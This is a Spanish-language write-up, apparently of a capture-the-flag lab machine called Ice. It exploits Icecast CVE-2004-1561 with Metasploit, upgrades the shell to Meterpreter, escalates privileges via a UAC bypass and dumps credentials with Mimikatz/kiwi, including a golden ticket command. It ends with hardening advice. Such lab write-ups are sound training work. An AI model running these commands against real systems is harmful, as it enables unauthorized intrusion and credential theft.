# **Explotación de Máquina Ice (CVE-2004-1561 - Icecast Header Overwrite)**

![Nivel: Intermedio](https://img.shields.io/badge/Nivel-Intermedio-orange) ![CVE-2004-1561: Crítico](https://img.shields.io/badge/CVE--2004--1561-Cr%C3%ADtico-red)

## **Descripción**
Este repositorio documenta la explotación completa de una máquina Windows vulnerable a través de:
1. Vulnerabilidad en Icecast 2.0.0-2.0.1 (CVE-2004-1561)
2. Escalada a Meterpreter
3. Post-explotación avanzada con Mimikatz

**Tiempo estimado**: 30-45 minutos  
**Dificultad**: Intermedia  
**Sistema operativo**: Windows

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Explotación](#explotación)
3. [Post-Explotación](#post-explotación)
4. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo Inicial
```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.22.53 -oN Ice
```
**Hallazgos clave**:
- 8000/tcp : Icecast 2.0.0-2.0.1 (vulnerable a CVE-2004-1561)

## **Explotación**

### 2. Configuración de Metasploit
```bash
msfconsole
use exploit/windows/http/icecast_header
set RHOSTS 10.10.22.53
set RPORT 8000
exploit
```

### 3. Mejora a Meterpreter
```msf
background
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
sessions -i 2
```

## **Post-Explotación**

### 4. Escalada de Privilegios
```msf
background
use multi/recon/local_exploit_suggester
set SESSION 2
run
```
Ejecutar exploit sugerido (ej: `windows/local/bypassuac_eventvwr`)

### 5. Extracción de Credenciales
```meterpreter
load kiwi
creds_all
hashdump
```

### 6. Técnicas Avanzadas
**Golden Ticket Attack**:
```meterpreter
golden_ticket_create -u Administrator -d dominio.local -k [KRBTGT_HASH] -t C:\\golden.tck
```

**Captura remota**:
```meterpreter
screenshare
```

## **Conclusión**

### Vulnerabilidades Críticas
1. Versión vulnerable de Icecast (CVE-2004-1561)
2. Configuración insegura de privilegios
3. Hashes NTLM accesibles

### Hardening Recomendado
- Actualizar Icecast a última versión
- Implementar LSA Protection
- Restringir privilegios de servicio


> 🔐 **Aviso Legal**: Solo para uso en entornos con permiso explícito.

---

**Herramientas utilizadas**:
- Nmap
- Metasploit Framework
- Mimikatz (Kiwi)

**Referencias**:
- [CVE-2004-1561 Details](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1561)
- [Icecast Security Advisories](https://icecast.org/security/)
